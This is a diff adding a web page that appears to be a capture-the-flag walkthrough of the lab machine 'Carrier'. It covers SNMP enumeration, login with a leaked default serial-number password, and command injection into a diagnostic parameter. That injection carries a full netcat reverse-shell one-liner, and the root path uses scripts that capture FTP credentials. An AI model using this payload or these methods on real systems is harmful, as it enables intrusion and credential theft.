@@ -1,0 +1,241 @@
+---
+layout: default
+---
+<body class="wrap">
+  <header>
+  <div class="flexbox">
+    <nav class="main-nav hide-on-mobiles">
+      <ul>
+  <li class="">
+    <a href="/">Home</a>
+  </li>
+  <p>
+  This machine is showing only 3 open ports on TCP and one off UDP. This stress the importance of having a look on entire port availability as you start an assessment. None of TCP ports allow anonymous access so the starting enumeration is UDP port. Then you can find a intuitive web login form for  Lyghtspeed which will drive you to a quagga message. Burp is your friend as well as FTP opensource server/client options from the wild.
+  </p>
+</ul>
+
+    </nav>
+  </div>
+</header>
+
+
+    <section class="news">
+    <div class="grid">
+
+
+
+      <div class="unit four-fifths">
+        <article>
+  <h2>
+    Access
+  </h2>
+  <span class="post-category">
+    <span class="label">
+      Walkthroughs
+    </span>
+  </span>
+  <div class="post-meta">
+    <span class="post-date">
+      15 March 2019
+    </span>
+  </div>
+  <p></p>
+  <div class="post-content">
+						<div class="embed-container">
+							<img src="./resources/machine.png" />
+						</div>
+</br>
+						
+    <p><strong>Machine: Carrier<br />
+OS: Linux<br />
+IP: 10.10.10.105</strong></p>
+<p>
+	<div>
+<p>As usual I start with a normal enumeration which show only 3 ports: 21,22 and 80. Having a look at them, 21 was not allowing anonymous login, neither 22  or 80 I think is too less so I decided to scan the UDP ports as well.</p>
+</div><p></p>
+						<div class="embed-container">
+							<img src="./resources/nmap.png" />
+						</div>
+</p>
+<div>
+<p>
+Now we know that port 67 and 161 are also available. 161 is a snmp port. 
+</br>
+Read more here: LINK for SNMP documentation
+</p>
+</br>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/lyghtspeed.png" />
+						</div>
+</p>
+<p>Port 80 serves a webpage and is showing two types of error:
+</br>
+Error 45007
+</br>
+Error 45009
+</br>
+Why? I didn’t dream last night why I have two errors but maybe tonight after couple of beers I will have an error for myself
+</p>
+</br>
+<p>Let’s enumerate port 161 UDP</p>
+</br>
+<p><i>
+snmpwalk 10.10.10.105 -c public -v 2c
+</i>
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/snmpwalk.png" />
+						</div>
+</p>
+</br>
+<p>
+	String SN#NET_45JDX23 is wired, with a small google search, I found out this is a serial number for Lyghtspeed device and is used as password for (initial) login. I’m paraphesing initial because it’s a best practice to change the default password in real life. However, by the time pass I see more and more lazy administrators that do not do it. Most of them are behind a corporatiste reason “nobody told me or is not written in the documentation/OSG/etc”. However, the world is not full of academicians…
+</br>
+Let’s try to login then: username admin and password NET_45JDX23 et voila:
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/login.png" />
+						</div>
+</p>
+<div>
+<p>
+Quick check the available buttons and during same time lunch a gobuster search for any possible directory that might be available.
+</p>
+<p><i>
+gobuster -w /usr/share/dirbuster/wordlist/ -u http://10.10.10.104/
+</i></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/diagnostic.png" />
+						</div>
+</p>
+</br>
+<p>
+	Quagga. Hmm seems this machine Carrier machine does not consist only in one IP. 
+</br>
+Indeed as expected, one of the gobuster result is the following network diagram.
+
+</p>
+<p>
+	or
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/diagram.png" />
+						</div>
+</p>
+<div>
+	<p>
+Now what quagga does? 
+</br>
+I see this diag.php page is sending a wired parameter.
+
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/burp1.png" />
+						</div>
+</p>
+<div>
+The value that check is receiving by default is the base64 encoding for quagga.
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/burp2.png" />
+						</div>
+</p>
+<div>
+<p>
+Seams promising. Let’s add in additional our own remote shell.
+</br>
+There are plenty of options to send them, you can have a look on pentestmonkeys.com/reverse shell
+</br>
+I like to try them all usually..probably it’s a dumb version to enumerate..but I have a lot of time available…
+</br>
+Let’s add
+</br><i>
+quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.12.104 4444 >/tmp/f
+</i>
+</p>
+
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/burp3.png" />
+						</div>
+</p>
+<div>
+<p>
+	Dancing on the chair.
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/user.png" />
+						</div>
+</p>
+<div>
+Half of machine done. 
+</div>
+</br>
+<div>
+	###<b>User to root path</b></br>
+	### User to root path</br>
+Do you like reading? Because now it’s your reading seassion on the main page:
+</br>
+Did you notice: "one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network"
+</br>
+We need a script that will enumerate the FTP credentials.
+</br>
+By google it a bit, I found 
+https://gist.github.com/ZoeS17/467387af22de19c028f0430dcfc5ada8
+</br>
+or
+</br>
+https://github.com/Aelof3/htb/blob/master/ftpds.py
+</br>
+<i>ifconfig eth2 10.10.15.68 netmask 255.255.255.128</i>
+</br>
+<i>python3 ftpreal.py</i>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/ftpserver.png" />
+						</div>
+</p>
+<div>
+After a while… we have the creds on our machine
+</br>
+ssh with root to the machine : root@10.10.10.105
+</br>
+Finally,
+</br>
+</div>
+<div>					
+</br>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/root.png" />
+						</div>
+</p>
+
+
+
+
+
+
+<div>
+I hope you enjoyed the write-up and didn't made you wasting time. Drop me a cup of coffee for Sundays (<a href="https://ko-fi.com/y2xhcmtrzw50"> https://ko-fi.com/y2xhcmtrzw50 </a>) or email me kryptoniteclark@protonmail.com 
+</div>
+</div>
+</article>
+      </div>
+</body>
